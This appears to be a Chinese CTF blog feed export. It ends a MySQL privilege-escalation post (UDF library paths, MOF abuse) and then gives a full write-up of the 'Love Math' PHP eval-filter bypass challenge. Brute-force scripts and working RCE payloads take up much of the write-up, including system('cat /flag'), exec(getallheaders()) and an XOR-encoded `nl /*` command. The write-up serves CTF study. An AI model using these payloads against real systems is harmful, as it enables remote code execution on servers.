class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> ‘<span class="hljs-operator">%</span>plugin<span class="hljs-operator">%</span>’; # 查看plugin路径。<br></code></pre></td></tr></table></figure><h3 id="动态链接库写入函数"><a href="#动态链接库写入函数" class="headerlink" title="动态链接库写入函数"></a>动态链接库写入函数</h3><ul><li><strong>sqlmap 的 UDF 动态链接库文件位置</strong>(sqlmap的动态链接库需要使用自带解码工具cloak.py解码)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap根目录/data/udf/mysql<br></code></pre></td></tr></table></figure><ul><li><strong>Metasploit 的 UDF 动态链接库文件位置</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSF 根目录/embedded/framework/data/exploits/mysql<br></code></pre></td></tr></table></figure><p>寻找插件目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show variables like <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>+---------------+------------------------------+<br>| Variable_name | Value                        |<br>+---------------+------------------------------+<br>| plugin_dir    | /usr/local/mysql/lib/plugin/ |<br>+---------------+------------------------------+<br></code></pre></td></tr></table></figure><p>写入动态数据库</p><p>坑，待补</p><h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mysql</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php利用math函数rce相关思考与理解</title>
    <link href="/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/"/>
    <url>/2022/01/20/php%E5%88%A9%E7%94%A8math%E5%87%BD%E6%95%B0rce%E7%9B%B8%E5%85%B3%E6%80%9D%E8%80%83%E4%B8%8E%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="php利用math函数rce相关思考与理解"><a href="#php利用math函数rce相关思考与理解" class="headerlink" title="php利用math函数rce相关思考与理解"></a>php利用math函数rce相关思考与理解</h1><h2 id="0x00题目背景"><a href="#0x00题目背景" class="headerlink" title="0x00题目背景"></a>0x00题目背景</h2><p>来自2019国赛love math，以及[NESTCTF 2019]Love Math 2，两题的区别在于对payload的长度限制不同</p><h3 id="相关过滤"><a href="#相关过滤" class="headerlink" title="相关过滤"></a>相关过滤</h3><p>长度限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">60</span>) &#123;<span class="hljs-comment">//国赛限制80</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>黑名单特殊字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br></code></pre></td></tr></table></figure><p>白名单函数（都为math函数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <span class="hljs-comment">//提取payload中函数名及变量名</span><br></code></pre></td></tr></table></figure><blockquote><p>php参考手册中提到，用于匹配php有效变量名，可以使用正则<code>[a-zA-Z_/x7f-/xff][a-zA-Z0-9_/x7f-/xff]*</code> 因此payload中若使用变量，命名必须在白名单函数中选择,如果是数组索引也可以用纯数字(不符合变量名命名法则)</p></blockquote><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>eval函数参数若是字符串，必须符合php代码语法，因此可以插入多行代码</p></blockquote><h2 id="0x01-利用math函数构造函数名"><a href="#0x01-利用math函数构造函数名" class="headerlink" title="0x01 利用math函数构造函数名"></a>0x01 利用math函数构造函数名</h2><h3 id="进制转换–获取小写字母"><a href="#进制转换–获取小写字母" class="headerlink" title="进制转换–获取小写字母"></a>进制转换–获取小写字母</h3><p>利用到进制转换，从11进制到36进制均有小写字母，在保证转换结果简洁及纯数字的情况下，选择36进制转10进制(36进制含a-z)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//先反向</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//15941</span><br><span class="hljs-comment">//这样就可以用纯数字通过三十六进制转换得到纯字母字符串了</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">15941</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<span class="hljs-comment">//cat</span><br></code></pre></td></tr></table></figure><h3 id="字符串异或–获取特殊字符及其组合"><a href="#字符串异或–获取特殊字符及其组合" class="headerlink" title="字符串异或–获取特殊字符及其组合"></a>字符串异或–获取特殊字符及其组合</h3><h4 id="异或性质"><a href="#异或性质" class="headerlink" title="异或性质"></a>异或性质</h4><ol><li>结合律a ^ b ^ c &#x3D; a ^ c ^ b</li><li>交换律a ^ b &#x3D; b ^ a</li><li>数值交换（能交换 a 与 b 的值）a &#x3D; a ^ b; b &#x3D; a ^ b; a &#x3D; a ^ b;</li><li>a^b^b&#x3D;a</li></ol><h4 id="php字符串异或分为两种情况"><a href="#php字符串异或分为两种情况" class="headerlink" title="php字符串异或分为两种情况"></a>php字符串异或分为两种情况</h4><ul><li><p>长度一致的字符串异或，对应字符各自转换成ascii码值异或后得到新字符，组成新字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tan&quot;</span>^<span class="hljs-string">&quot;*\/&quot;</span>;<span class="hljs-comment">//^=A</span><br></code></pre></td></tr></table></figure></li><li><p>长度不一致的字符串异或，按最短的字符串长度按位异或</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tan&quot;</span>^<span class="hljs-string">&quot;*&quot;</span>;<span class="hljs-comment">//^</span><br></code></pre></td></tr></table></figure></li></ul><p>异或字符串可以构造出新字符，但只用白名单的函数名的话，大多是ascii码值接近的小写字母，异或后得到的也多是ascii码值小的<u>不可见字符</u>，不够全面。</p><p>因此可以利用<code>a^b^b=a</code>这个性质，将a看作要获取的特殊字符，b为白名单函数名异或组合,靠脚本爆破出可以通过进制转换表示的<code>a^b</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//爆破脚本</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$whitelist1</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>,<span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-variable">$whitelist2</span> = [ <span class="hljs-string">&#x27;abs&#x27;</span>,<span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<span class="hljs-comment">//与whitelist1相同</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$whitelist1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span>):<br>   <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$whitelist2</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>):<br>       <span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>^<span class="hljs-variable">$i</span>^<span class="hljs-string">&quot; /&quot;</span>;<span class="hljs-comment">//a^b</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;   &quot;</span> . <span class="hljs-variable">$i</span> . <span class="hljs-string">&quot; &quot;</span> . <span class="hljs-variable">$k</span>;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>   <span class="hljs-keyword">endforeach</span>;<br><span class="hljs-keyword">endforeach</span>;<br></code></pre></td></tr></table></figure><blockquote><p>输出结果说明</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">16</span>   tanh exp <span class="hljs-comment">//意思是&quot; /&quot;^tanh^exp=&quot;16&quot;</span><br><span class="hljs-comment">//因此要想得到&quot; /&quot;只要</span><br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">22</span>)^tanh^exp  <span class="hljs-comment">//即&quot; /&quot;^tanh^exp^tanh^exp=&quot; /&quot;^0=&quot; /&quot;</span><br><span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-number">10</span>)^tanh^exp<span class="hljs-comment">//也可以</span><br></code></pre></td></tr></table></figure><h4 id="注意⚠️"><a href="#注意⚠️" class="headerlink" title="注意⚠️"></a>注意⚠️</h4><ul><li><p>不能直接<code>16^tanh^exp</code> ，这样的16会被当作int型数据处理，使用进制转换函数可以转成string类型，同时选取的数值转成16进制不能有字母。</p></li><li><p>根据长度不一致字符串异或的运算规则，白名单中最短的是pi，因此特殊字符组合尽量不超过两个，如果一定要更长的特殊字符组合，要删除白名单中较短的函数名，不然得到的结果都是截断的，而特殊字符组合越长，白名单中可用函数名也就越少，出现纯数字结果的可能性也越低，这也是为什么这里不能直接构造<code>system(&#39;cat /flag&#39; )</code></p></li></ul></blockquote><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>一旦将特殊字符改成大写字母或与下划线的组合，输出中几乎没有纯数字结果。</p><h3 id="引入数字字符串的异或–构造下划线和大写字母组合"><a href="#引入数字字符串的异或–构造下划线和大写字母组合" class="headerlink" title="引入数字字符串的异或–构造下划线和大写字母组合"></a>引入数字字符串的异或–构造下划线和大写字母组合</h3><p>上面的异或结果可以归纳成<code>特殊字符组合^白名单函数1^白名单函数2=纯数字字符串</code>。</p><p>因此可以合理推测<code>纯数字字符串^白名单函数1^白名单函数2=特殊字符组合</code>。</p><p>纯字符串如果用<code>dechex</code>的方式转换，非常浪费payload长度，可以利用字符串拼接时类型转换的特性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$i</span>=(<span class="hljs-number">1</span>).(<span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$i</span>);<span class="hljs-comment">//string(2) &quot;12&quot;</span><br></code></pre></td></tr></table></figure><p>爆破脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$k</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">9</span>; <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$j</span> &lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-variable">$exp</span> = <span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>] ^ <span class="hljs-variable">$i</span>.<span class="hljs-variable">$j</span>;<span class="hljs-comment">//$i $j字符串拼接得到&quot;00&quot;-&quot;99&quot;</span><br>            <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;^<span class="hljs-subst">$i</span><span class="hljs-subst">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-subst">$exp</span>&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>由于pi的存在，构造出来的组合都是两个字符，会惊喜地发现大多数为下划线和大写字母组合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">结果中 tanh^<span class="hljs-number">15</span>==&gt;ET is_nan^<span class="hljs-number">64</span>==&gt;_G <br>因此构造 (is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>)) 正是 <span class="hljs-string">&quot;_G&quot;</span>.<span class="hljs-string">&quot;ET&quot;</span> ，即 <span class="hljs-string">&quot;_GET&quot;</span><br></code></pre></td></tr></table></figure><p>再根据PHP可变变量的特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-comment">//_GET</span><br><span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">1</span>&#125;;<span class="hljs-comment">//$_GET[1]</span><br></code></pre></td></tr></table></figure><p>{}可以代替[],这样就可以通过get传参数，缩短payload长度</p></blockquote><p>$_GET[1]接收的数值会转换成字符串，因此即使拼接到了代码中也无法执行</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214590.jpg" alt="1"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214171.jpg" alt="2"></p><p>因此需要像eval这样的函数执行字符串php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=<span class="hljs-variable">$$pi</span>;<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">42633</span>,<span class="hljs-number">19</span>,<span class="hljs-number">33</span>)(<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>也可以利用php可变函数的特性：<code>($a)[system]($_GET[1])</code> –&gt;php会将<code>$_GET[1]</code>的内容当作参数传入system函数执行。<code>$a</code>只要求是个变量，在这题的背景下可以用<code>$pi</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=<span class="hljs-variable">$$pi</span>;<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">0</span>&#125;(<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">0</span>=system&amp;<span class="hljs-number">1</span>=cat /flag<br></code></pre></td></tr></table></figure><h2 id="0x02-payload缩短技巧"><a href="#0x02-payload缩短技巧" class="headerlink" title="0x02 payload缩短技巧"></a>0x02 payload缩短技巧</h2><h3 id="通过外部传参数"><a href="#通过外部传参数" class="headerlink" title="通过外部传参数"></a>通过外部传参数</h3><ul><li><p>使用$_GET[1]，索引选择最简短且符合题目要求的数字1，系统命令通过1传参，不占有payload</p></li><li><p>使用getallheaders获取请求头信息，将索引设成1，将获取header中key为1的value，再将这个结果传入exec函数，但这个payload较长，超过60字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=base_convert,<span class="hljs-variable">$pi</span>(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)<br><span class="hljs-comment">//base_convert(696468,10,36) -&gt; exec</span><br><span class="hljs-comment">//base_convert(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="hljs-comment">//exec(getallheaders()&#123;1&#125;)</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="穷举进制转换"><a href="#穷举进制转换" class="headerlink" title="穷举进制转换"></a>穷举进制转换</h3><p>如果要得到flag字符串，10进制转36进制需要数字为727432,有6位，而通过脚本穷举+正则匹配筛选可以发现32进制转22进制时，只需要4位数字就可以得到flag</p><p>脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$tmp</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$i</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$tmp</span>)-<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>&gt;<span class="hljs-variable">$num</span>)<br>        <span class="hljs-variable">$num</span>=<span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-variable">$res</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">11</span>+<span class="hljs-variable">$num</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">36</span>;<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">10</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">36</span>;<span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-variable">$res</span>.= <span class="hljs-variable">$i</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$j</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">2</span>*<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\d&#123;2&#125;\s\d&#123;2&#125;\s\d&#123;&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&#x27;&#125;\n/&#x27;</span>,<span class="hljs-variable">$res</span>,<span class="hljs-variable">$mc</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$mc</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214513.jpg" alt="image-20220809211543165"></p><blockquote><p><code>base_convert(5648,32,22)--&gt;&#39;flag&#39;</code></p></blockquote><h2 id="0x03-一些尝试"><a href="#0x03-一些尝试" class="headerlink" title="0x03 一些尝试"></a>0x03 一些尝试</h2><h3 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h3><p>上面的payload几乎都使用了花括号来访问数组，如果题目过滤了花括号，那么是否可以在保证长度尽可能小的情况下,构造无花括号payload</p><blockquote><p>PHP7.4不再能够使用花括号来访问<a href="https://www.yuanmaluntan.com/tags-11630.html">数组</a>或者字符串的偏移.需要将{}修改成[] （本题环境为7.3.9）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072226764.jpg" alt="4"></p><h3 id="无花括号payload"><a href="#无花括号payload" class="headerlink" title="无花括号payload"></a>无花括号payload</h3><p>由于传入的是字符串，反引号不能被识别为系统命令执行，因此使用名称较短的exec函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p>但是这样就不能外部传入命令来节省payload，因此要求执行的命令足够短，这里使用nl命令</p><p>linux下执行<code>nl /*</code>扫描根目录，会打印根目录下所有文件，不会目录向下递归</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072228668.jpg" alt="6"></p><blockquote><p><code>nl [参数] [文件]</code></p><p>nl命令是一个很好用的编号过滤工具。该命令可以读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">aff   rad2deg sin <span class="hljs-comment">//`nl</span><br><span class="hljs-number">16</span>   exp tan   <span class="hljs-comment">// /</span><br><span class="hljs-number">9</span>f   cos pi  <span class="hljs-comment">//*`</span><br>  <br>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">2815</span>)^rad2deg^sin).((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>)^exp^tan).(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">159</span>)^cos^pi) <span class="hljs-comment">//`nl /*`</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ca   abs log <span class="hljs-comment">//nl</span><br><span class="hljs-number">164</span>   exp tan <span class="hljs-comment">// /*</span><br>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">202</span>)^abs^log).(<span class="hljs-title function_ invoke__">hexdec</span>(a4)^exp^tan) <span class="hljs-comment">//nl 